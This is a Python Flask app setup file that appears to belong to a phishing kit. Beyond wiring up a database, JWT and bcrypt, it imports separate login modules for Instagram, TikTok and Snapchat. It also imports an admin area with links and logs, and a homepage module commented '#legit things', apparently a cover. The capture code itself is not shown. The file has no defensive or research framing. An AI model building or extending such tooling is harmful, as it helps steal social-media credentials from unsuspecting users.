from flask import Flask, request, redirect
from flask_sqlalchemy import SQLAlchemy
from app.main.config import settings
from flask_jwt_extended import JWTManager
from flask_bcrypt import Bcrypt
import os
app = Flask(__name__)
app.config.from_object(settings.Config)
db = SQLAlchemy(app)
jwt = JWTManager(app)
bcrypt = Bcrypt(app)
@jwt.unauthorized_loader
def unauthorized_loader_handler(error):
    return redirect('/new_user')

@jwt.invalid_token_loader
def unauthorized_loader_handler(error):
    return redirect('/new_user')

@jwt.expired_token_loader
def unauthorized_loader_handler(error):
    return redirect('/new_user')
from app.main.admin import admin, index, links, login, logs
# instagram
#from app.main.ig import index
from app.main.ig.login import index
# tiktok
#from app.main.tt import index
from app.main.tt.login import index
# snapchat
#from app.main.sc import index
from app.main.sc.login import index
#legit things
from app.main.legit import homepage
#landing page
from app.main.landing import landing_page
